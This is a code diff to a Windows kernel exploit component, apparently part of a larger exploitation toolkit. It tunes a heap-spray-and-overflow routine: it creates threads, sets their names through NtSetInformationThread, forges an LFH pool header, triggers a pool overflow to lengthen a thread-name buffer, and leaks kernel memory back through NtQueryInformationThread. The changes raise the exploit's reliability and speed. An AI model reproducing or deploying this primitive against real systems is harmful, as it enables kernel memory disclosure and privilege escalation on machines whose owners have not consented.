@@ -11,16 +11,15 @@ static const size_t THREADNAME_MAX_LEAK = 64 * 1024 * 1024; // 64 MB
 // exitEvent is created once in the constructor to ensure proper error handling
 static HANDLE exitEvent = NULL;
 
-// Tunables (can be overridden in config.h)
-#ifndef THREADNAME_THREAD_COUNT_BASE
-#define THREADNAME_THREAD_COUNT_BASE 768
-#endif
-#ifndef THREADNAME_THREAD_COUNT_STEP
-#define THREADNAME_THREAD_COUNT_STEP 128
-#endif
-#ifndef THREADNAME_THREAD_SLEEP_MS
-#define THREADNAME_THREAD_SLEEP_MS 50
-#endif
+// Tuned reliability/speed knobs from the best logged run.
+#undef THREADNAME_THREAD_COUNT
+#define THREADNAME_THREAD_COUNT 192
+#undef THREADNAME_MAX_USES_PER_LEAK
+#define THREADNAME_MAX_USES_PER_LEAK 256
+#undef THREADNAME_OVERFLOW_SETTLE_MS
+#define THREADNAME_OVERFLOW_SETTLE_MS 1
+#undef VERBOSE_LEAK_LOGS
+#define VERBOSE_LEAK_LOGS 0
 
 DWORD WINAPI DummyThread(LPVOID lpParam) {
 	// Wait on event; if event handle is invalid just exit
@@ -77,7 +76,9 @@ bool ThreadNameManager::GetDataLeak(UINT64 iChunkSize, UINT64 iLeakSize, UINT64 
 
 	tnOverflow.poolHeader.poolTag = 0x6d4e6854;
 	tnOverflow.poolHeader.blockSize = 0x10;
-	tnOverflow.poolHeader.poolTag = 0x02;
+	// NOTE: Do not overwrite poolTag here. If a pool type/flags field exists in
+	// LFH_POOL_HEADER, set that instead in the structure definition. Overwriting
+	// poolTag breaks tag-based layout matching.
 
 	tnOverflow.threadName.Length = nameSize + leakSize;
 	tnOverflow.threadName.MaximumLength = nameSize + leakSize;
@@ -89,15 +90,28 @@ bool ThreadNameManager::GetDataLeak(UINT64 iChunkSize, UINT64 iLeakSize, UINT64 
 
 	for (UINT64 i = 0; i < maxRetries; i++)
 	{
-		// create half the threads before priming and the remainder after to mimic
-		// previous behavior while scaling counts
-		UINT64 threadTarget = (UINT64)(THREADNAME_THREAD_COUNT_BASE + (i * THREADNAME_THREAD_COUNT_STEP));
-		if (threadTarget < 256) threadTarget = 256; // minimal safety floor
-		CreateThreads(threadTarget);
+		UINT64 tCount = THREADNAME_THREAD_COUNT;
+		if (i == 0) {
+			tCount = THREADNAME_THREAD_COUNT / 2;
+		}
+		else if (i < 3) {
+			tCount = (THREADNAME_THREAD_COUNT * 2) / 3;
+		}
+		else if (i < 4) {
+			tCount = THREADNAME_THREAD_COUNT;
+		}
+		else {
+			tCount = THREADNAME_THREAD_COUNT + 64;
+		}
+		if (tCount < 128) tCount = 128;
+		if (tCount > 448) tCount = 448;
+
+		CreateThreads(tCount);
 		Hvergelmir::getInstance().PrimeOverflow(iChunkSize);
 
-		// Shorter delay improves overall runtime while preserving layout stability
-		Sleep(THREADNAME_THREAD_SLEEP_MS);
+		if (THREADNAME_OVERFLOW_SETTLE_MS > 0) {
+			Sleep(THREADNAME_OVERFLOW_SETTLE_MS);
+		}
 		Hvergelmir::getInstance().TriggerOverflow((BYTE*)&tnOverflow, 0x24);
 
 		leakThread = ScanForCorruptName();
@@ -154,6 +168,9 @@ void ThreadNameManager::CreateThreads(UINT64 iThreadCount)
 		if (_NtSetInformationThread) {
 			_NtSetInformationThread(threads[i], ThreadNameInformation, &threadName, sizeof(threadName));
 		}
+		if ((i & 31) == 31) {
+			Sleep(0);
+		}
 	}
 }
 
@@ -208,7 +225,6 @@ std::vector<BYTE> ThreadNameManager::LeakData()
 		);
 		return empty;
 	}
-	++leakUseCount;
     // _NtQueryInformationThread is expected to return leakSize bytes for the leak
 	// guard against absurd sizes
 	if (leakSize == 0 || leakSize > THREADNAME_MAX_LEAK) {
@@ -273,7 +289,10 @@ std::vector<BYTE> ThreadNameManager::LeakData()
 		copyLen = (size_t)((ULONG)returnLength - (ULONG)nameSize - 0x18);
 	}
 	std::vector<BYTE> output(copyLen);
-	if (copyLen > 0) memcpy(output.data(), data.data() + nameSize + 0x18, copyLen);
+	if (copyLen > 0) {
+		memcpy(output.data(), data.data() + nameSize + 0x18, copyLen);
+		++leakUseCount;
+	}
 	return output;
 }
 
@@ -286,7 +305,6 @@ BYTE* ThreadNameManager::LeakDataMalloc()
 	memcpy(ptr, v.data(), v.size());
 	return ptr;
 }
-
 
 void ThreadNameManager::FreeSlots(UINT64 iStartCount, UINT64 iInterval)
 {
@@ -341,8 +359,22 @@ void ThreadNameManager::ClearThreads()
     if (exitEvent) SetEvent(exitEvent);
 
     if (threadCount > 0 && threads) {
-		// wait with timeout to avoid infinite hang; on timeout proceed to best-effort cleanup
-		DWORD waitRes = WaitForMultipleObjects((DWORD)threadCount, threads, TRUE, 5000);
+		// Wait in batches to respect MAXIMUM_WAIT_OBJECTS limit and avoid indefinite hangs.
+		const DWORD batchTimeoutMs = 1000;
+		HANDLE batch[64];
+		DWORD batchCount = 0;
+		for (UINT64 i = 0; i < threadCount; ++i) {
+			if (threads[i] != NULL && threads[i] != INVALID_HANDLE_VALUE) {
+				batch[batchCount++] = threads[i];
+				if (batchCount == 64) {
+					WaitForMultipleObjects(batchCount, batch, TRUE, batchTimeoutMs);
+					batchCount = 0;
+				}
+			}
+		}
+		if (batchCount > 0) {
+			WaitForMultipleObjects(batchCount, batch, TRUE, batchTimeoutMs);
+		}
 
 		for (UINT64 i = 0; i < threadCount; i++) {
 			if (threads[i] != NULL && threads[i] != INVALID_HANDLE_VALUE) {
